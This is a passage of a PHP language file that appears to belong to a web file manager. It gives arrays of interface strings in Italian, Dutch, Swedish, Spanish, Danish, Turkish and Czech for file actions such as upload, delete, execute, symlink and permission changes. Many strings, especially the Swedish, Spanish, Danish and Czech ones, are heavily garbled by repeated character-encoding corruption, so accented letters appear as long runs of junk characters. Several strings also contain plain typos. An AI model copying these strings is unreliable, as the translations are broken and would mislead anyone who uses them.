'not_executed' => "\"[%1]\" non Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato eseguito con successo\n{%2}",
'saved' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato salvato.',
'not_saved' => '"[%1]" non Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato salvato.',
'symlinked' => 'Il link siambolico da "[%2]" a "[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato creato.',
'not_symlinked' => 'Il link siambolico da "[%2]" a "[%1]" non Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato creato.',
'permission_for' => 'Permessi di "[%1]":',
'permission_set' => 'I permessi di "[%1]" sono stati impostati [%2].',
'permission_not_set' => 'I permessi di "[%1]" non sono stati impostati [%2].',
'not_readable' => '"[%1]" non puÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â² essere letto.'
		);

	case 'nl':

		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' => 'Directory',
'file' => 'Bestand',
'filename' => 'Bestandsnaam',

'size' => 'Grootte',
'permission' => 'Bevoegdheid',
'owner' => 'Eigenaar',
'group' => 'Groep',
'other' => 'Anderen',
'functions' => 'Functies',

'read' => 'lezen',
'write' => 'schrijven',
'execute' => 'uitvoeren',

'create_symlink' => 'maak symlink',
'delete' => 'verwijderen',
'rename' => 'hernoemen',
'move' => 'verplaatsen',
'copy' => 'kopieren',
'edit' => 'bewerken',
'download' => 'downloaden',
'upload' => 'uploaden',
'create' => 'aanmaken',
'change' => 'veranderen',
'save' => 'opslaan',
'set' => 'instellen',
'reset' => 'resetten',
'relative' => 'Relatief pat naar doel',

'yes' => 'Ja',
'no' => 'Nee',
'back' => 'terug',
'destination' => 'Bestemming',
'symlink' => 'Symlink',
'no_output' => 'geen output',

'user' => 'Gebruiker',
'password' => 'Wachtwoord',
'add' => 'toevoegen',
'add_basic_auth' => 'add basic-authentification',

'uploaded' => '"[%1]" is verstuurd.',
'not_uploaded' => '"[%1]" kan niet worden verstuurd.',
'already_exists' => '"[%1]" bestaat al.',
'created' => '"[%1]" is aangemaakt.',
'not_created' => '"[%1]" kan niet worden aangemaakt.',
'really_delete' => 'Deze bestanden verwijderen?',
'deleted' => "Deze bestanden zijn verwijderd:\n[%1]",
'not_deleted' => "Deze bestanden konden niet worden verwijderd:\n[%1]",
'rename_file' => 'Bestandsnaam veranderen:',
'renamed' => '"[%1]" heet nu "[%2]".',
'not_renamed' => '"[%1] kon niet worden veranderd in "[%2]".',
'move_files' => 'Verplaats deze bestanden:',
'moved' => "Deze bestanden zijn verplaatst naar \"[%2]\":\n[%1]",
'not_moved' => "Kan deze bestanden niet verplaatsen naar \"[%2]\":\n[%1]",
'copy_files' => 'Kopieer deze bestanden:',
'copied' => "Deze bestanden zijn gekopieerd naar \"[%2]\":\n[%1]",
'not_copied' => "Deze bestanden kunnen niet worden gekopieerd naar \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" kan niet worden bewerkt.',
'executed' => "\"[%1]\" is met succes uitgevoerd:\n{%2}",
'not_executed' => "\"[%1]\" is niet goed uitgevoerd:\n{%2}",
'saved' => '"[%1]" is opgeslagen.',
'not_saved' => '"[%1]" is niet opgeslagen.',
'symlinked' => 'Symlink van "[%2]" naar "[%1]" is aangemaakt.',
'not_symlinked' => 'Symlink van "[%2]" naar "[%1]" is niet aangemaakt.',
'permission_for' => 'Bevoegdheid voor "[%1]":',
'permission_set' => 'Bevoegdheid van "[%1]" is ingesteld op [%2].',
'permission_not_set' => 'Bevoegdheid van "[%1]" is niet ingesteld op [%2].',
'not_readable' => '"[%1]" kan niet worden gelezen.'
		);

	case 'se':

		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';
 
		return array(
'directory' => 'Mapp',
'file' => 'Fil',
'filename' => 'Filnamn',
 
'size' => 'Storlek',
'permission' => 'SÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤kerhetsnivÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¥',
'owner' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½gare',
'group' => 'Grupp',
'other' => 'Andra',
'functions' => 'Funktioner',
 
'read' => 'LÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤s',
'write' => 'Skriv',
'execute' => 'UtfÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶r',
 
'create_symlink' => 'Skapa symlink',
'delete' => 'Radera',
'rename' => 'Byt namn',
'move' => 'Flytta',
'copy' => 'Kopiera',
'edit' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ndra',
'download' => 'Ladda ner',
'upload' => 'Ladda upp',
'create' => 'Skapa',
'change' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ndra',
'save' => 'Spara',
'set' => 'Markera',
'reset' => 'TÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶m',
'relative' => 'Relative path to target',
 
'yes' => 'Ja',
'no' => 'Nej',
'back' => 'Tillbaks',
'destination' => 'Destination',
'symlink' => 'Symlink',
'no_output' => 'no output',
 
'user' => 'AnvÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤ndare',
'password' => 'LÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶senord',
'add' => 'LÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤gg till',
'add_basic_auth' => 'add basic-authentification',
 
'uploaded' => '"[%1]" har laddats upp.',
'not_uploaded' => '"[%1]" kunde inte laddas upp.',
'already_exists' => '"[%1]" finns redan.',
'created' => '"[%1]" har skapats.',
'not_created' => '"[%1]" kunde inte skapas.',
'really_delete' => 'Radera dessa filer?',
'deleted' => "De hÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤r filerna har raderats:\n[%1]",
'not_deleted' => "Dessa filer kunde inte raderas:\n[%1]",
'rename_file' => 'Byt namn pÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¥ fil:',
'renamed' => '"[%1]" har bytt namn till "[%2]".',
'not_renamed' => '"[%1] kunde inte dÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶pas om till "[%2]".',
'move_files' => 'Flytta dessa filer:',
'moved' => "Dessa filer har flyttats till \"[%2]\":\n[%1]",
'not_moved' => "Dessa filer kunde inte flyttas till \"[%2]\":\n[%1]",
'copy_files' => 'Kopiera dessa filer:',
'copied' => "Dessa filer har kopierats till \"[%2]\":\n[%1]",
'not_copied' => "Dessa filer kunde inte kopieras till \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" kan inte Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤ndras.',
'executed' => "\"[%1]\" har utfÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶rts:\n{%2}",
'not_executed' => "\"[%1]\" kunde inte utfÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶ras:\n{%2}",
'saved' => '"[%1]" har sparats.',
'not_saved' => '"[%1]" kunde inte sparas.',
'symlinked' => 'Symlink frÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¥n "[%2]" till "[%1]" har skapats.',
'not_symlinked' => 'Symlink frÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¥n "[%2]" till "[%1]" kunde inte skapas.',
'permission_for' => 'RÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤ttigheter fÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶r "[%1]":',
'permission_set' => 'RÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤ttigheter fÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶r "[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤ndrades till [%2].',
'permission_not_set' => 'Permission of "[%1]" could not be set to [%2].',
'not_readable' => '"[%1]" kan inte lÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¤sas.'
		);

	case 'es':

		$date_format = 'j/n/y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' => 'Directorio',
'file' => 'Archivo',
'filename' => 'Nombre Archivo',

'size' => 'TamaÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â±o',
'permission' => 'Permisos',
'owner' => 'Propietario',
'group' => 'Grupo',
'other' => 'Otros',
'functions' => 'Funciones',

'read' => 'lectura',
'write' => 'escritura',
'execute' => 'ejecuciÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â³n',

'create_symlink' => 'crear enlace',
'delete' => 'borrar',
'rename' => 'renombrar',
'move' => 'mover',
'copy' => 'copiar',
'edit' => 'editar',
'download' => 'bajar',
'upload' => 'subir',
'create' => 'crear',
'change' => 'cambiar',
'save' => 'salvar',
'set' => 'setear',
'reset' => 'resetear',
'relative' => 'Path relativo',

'yes' => 'Si',
'no' => 'No',
'back' => 'atrÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡s',
'destination' => 'Destino',
'symlink' => 'Enlace',
'no_output' => 'sin salida',

'user' => 'Usuario',
'password' => 'Clave',
'add' => 'agregar',
'add_basic_auth' => 'agregar autentificaciÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â³n bÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡sica',

'uploaded' => '"[%1]" ha sido subido.',
'not_uploaded' => '"[%1]" no pudo ser subido.',
'already_exists' => '"[%1]" ya existe.',
'created' => '"[%1]" ha sido creado.',
'not_created' => '"[%1]" no pudo ser creado.',
'really_delete' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¿Borra estos archivos?',
'deleted' => "Estos archivos han sido borrados:\n[%1]",
'not_deleted' => "Estos archivos no pudieron ser borrados:\n[%1]",
'rename_file' => 'Renombra archivo:',
'renamed' => '"[%1]" ha sido renombrado a "[%2]".',
'not_renamed' => '"[%1] no pudo ser renombrado a "[%2]".',
'move_files' => 'Mover estos archivos:',
'moved' => "Estos archivos han sido movidos a \"[%2]\":\n[%1]",
'not_moved' => "Estos archivos no pudieron ser movidos a \"[%2]\":\n[%1]",
'copy_files' => 'Copiar estos archivos:',
'copied' => "Estos archivos han sido copiados a  \"[%2]\":\n[%1]",
'not_copied' => "Estos archivos no pudieron ser copiados \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" no pudo ser editado.',
'executed' => "\"[%1]\" ha sido ejecutado correctamente:\n{%2}",
'not_executed' => "\"[%1]\" no pudo ser ejecutado correctamente:\n{%2}",
'saved' => '"[%1]" ha sido salvado.',
'not_saved' => '"[%1]" no pudo ser salvado.',
'symlinked' => 'Enlace desde "[%2]" a "[%1]" ha sido creado.',
'not_symlinked' => 'Enlace desde "[%2]" a "[%1]" no pudo ser creado.',
'permission_for' => 'Permisos de "[%1]":',
'permission_set' => 'Permisos de "[%1]" fueron seteados a [%2].',
'permission_not_set' => 'Permisos de "[%1]" no pudo ser seteado a [%2].',
'not_readable' => '"[%1]" no pudo ser leÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­do.'
		);

	case 'dk':

		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' => 'Mappe',
'file' => 'Fil',
'filename' => 'Filnavn',

'size' => 'StÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸rrelse',
'permission' => 'Rettighed',
'owner' => 'Ejer',
'group' => 'Gruppe',
'other' => 'Andre',
'functions' => 'Funktioner',

'read' => 'lÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¦s',
'write' => 'skriv',
'execute' => 'kÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸r',

'create_symlink' => 'opret symbolsk link',
'delete' => 'slet',
'rename' => 'omdÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸b',
'move' => 'flyt',
'copy' => 'kopier',
'edit' => 'rediger',
'download' => 'download',
'upload' => 'upload',
'create' => 'opret',
'change' => 'skift',
'save' => 'gem',
'set' => 'sÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¦t',
'reset' => 'nulstil',
'relative' => 'Relativ sti til valg',

'yes' => 'Ja',
'no' => 'Nej',
'back' => 'tilbage',
'destination' => 'Distination',
'symlink' => 'Symbolsk link',
'no_output' => 'ingen resultat',

'user' => 'Bruger',
'password' => 'Kodeord',
'add' => 'tilfÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸j',
'add_basic_auth' => 'tilfÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸j grundliggende rettigheder',

'uploaded' => '"[%1]" er blevet uploaded.',
'not_uploaded' => '"[%1]" kunnu ikke uploades.',
'already_exists' => '"[%1]" findes allerede.',
'created' => '"[%1]" er blevet oprettet.',
'not_created' => '"[%1]" kunne ikke oprettes.',
'really_delete' => 'Slet disse filer?',
'deleted' => "Disse filer er blevet slettet:\n[%1]",
'not_deleted' => "Disse filer kunne ikke slettes:\n[%1]",
'rename_file' => 'OmdÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸d fil:',
'renamed' => '"[%1]" er blevet omdÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸bt til "[%2]".',
'not_renamed' => '"[%1] kunne ikke omdÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸bes til "[%2]".',
'move_files' => 'Flyt disse filer:',
'moved' => "Disse filer er blevet flyttet til \"[%2]\":\n[%1]",
'not_moved' => "Disse filer kunne ikke flyttes til \"[%2]\":\n[%1]",
'copy_files' => 'Kopier disse filer:',
'copied' => "Disse filer er kopieret til \"[%2]\":\n[%1]",
'not_copied' => "Disse filer kunne ikke kopieres til \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" kan ikke redigeres.',
'executed' => "\"[%1]\" er blevet kÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸rt korrekt:\n{%2}",
'not_executed' => "\"[%1]\" kan ikke kÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¸res korrekt:\n{%2}",
'saved' => '"[%1]" er blevet gemt.',
'not_saved' => '"[%1]" kunne ikke gemmes.',
'symlinked' => 'Symbolsk link fra "[%2]" til "[%1]" er blevet oprettet.',
'not_symlinked' => 'Symbolsk link fra "[%2]" til "[%1]" kunne ikke oprettes.',
'permission_for' => 'Rettigheder for "[%1]":',
'permission_set' => 'Rettigheder for "[%1]" blev sat til [%2].',
'permission_not_set' => 'Rettigheder for "[%1]" kunne ikke sÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¦ttes til [%2].',
'not_readable' => '"[%1]" Kan ikke lÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¦ses.'
		);

	case 'tr':

		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' => 'Klasor',
'file' => 'Dosya',
'filename' => 'dosya adi',

'size' => 'boyutu',
'permission' => 'Izin',
'owner' => 'sahib',
'group' => 'Grup',
'other' => 'Digerleri',
'functions' => 'Fonksiyonlar',

'read' => 'oku',
'write' => 'yaz',
'execute' => 'calistir',

'create_symlink' => 'yarat symlink',
'delete' => 'sil',
'rename' => 'ad degistir',
'move' => 'tasi',
'copy' => 'kopyala',
'edit' => 'duzenle',
'download' => 'indir',
'upload' => 'Yukle',
'create' => 'create',
'change' => 'degistir',
'save' => 'kaydet',
'set' => 'ayar',
'reset' => 'sifirla',
'relative' => 'Hedef yola gore',

'yes' => 'Evet',
'no' => 'Hayir',
'back' => 'Geri',
'destination' => 'Hedef',
'symlink' => 'Kisa yol',
'no_output' => 'cikti yok',

'user' => 'Kullanici',
'password' => 'Sifre',
'add' => 'ekle',
'add_basic_auth' => 'ekle basit-authentification',

'uploaded' => '"[%1]" yuklendi.',
'not_uploaded' => '"[%1]" yuklenemedi.',
'already_exists' => '"[%1]" kullanilmakta.',
'created' => '"[%1]" olusturuldu.',
'not_created' => '"[%1]" olusturulamadi.',
'really_delete' => 'Bu dosyalar silinsin mi DOSTUM?',
'deleted' => "Bu dosyalar silindi:\n[%1]",
'not_deleted' => "Bu dosyalar silinemedi:\n[%1]",
'rename_file' => 'Adi degisen dosya:',
'renamed' => '"[%1]" adili dosyanin yeni adi "[%2]".',
'not_renamed' => '"[%1] adi degistirilemedi "[%2]" ile.',
'move_files' => 'Tasinan dosyalar:',
'moved' => "Bu dosyalari tasidiginiz yer \"[%2]\":\n[%1]",
'not_moved' => "Bu dosyalari tasiyamadiginiz yer \"[%2]\":\n[%1]",
'copy_files' => 'Kopyalanan dosyalar:',
'copied' => "Bu dosyalar kopyalandi \"[%2]\":\n[%1]",
'not_copied' => "Bu dosyalar kopyalanamiyor \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" duzenlenemiyor.',
'executed' => "\"[%1]\" Basariyla Calistirildi:\n{%2}",
'not_executed' => "\"[%1]\" Calistirilamadi:\n{%2}",
'saved' => '"[%1]" Kaydedildi.',
'not_saved' => '"[%1]" kaydedilemedi.',
'symlinked' => '"[%2]" den "[%1]" e kisayol olusturuldu.',
'not_symlinked' => '"[%2]"den "[%1]" e kisayol olusturulamadi.',
'permission_for' => 'Izinler "[%1]":',
'permission_set' => 'Izinler "[%1]" degistirildi [%2].',
'permission_not_set' => 'Izinler "[%1]" degistirilemedi [%2].',
'not_readable' => '"[%1]" okunamiyor.'
		);

	case 'cs':

		$date_format = 'd.m.y H:i:s';
		$word_charset = 'UTF-8';

		return array(
'directory' => 'AdresÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½',
'file' => 'Soubor',
'filename' => 'JmÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©no souboru',

'size' => 'Velikost',
'permission' => 'PrÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡va',
'owner' => 'VlastnÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­k',
'group' => 'Skupina',
'other' => 'OstatnÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­',
'functions' => 'Funkce',

'read' => 'Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½tenÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­',
'write' => 'ZÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡pis',
'execute' => 'SpouÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¡tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½nÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­',

'create_symlink' => 'VytvoÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½it symbolickÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ odkaz',
'delete' => 'Smazat',
'rename' => 'PÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ejmenovat',
'move' => 'PÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½esunout',
'copy' => 'ZkopÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â­rovat',
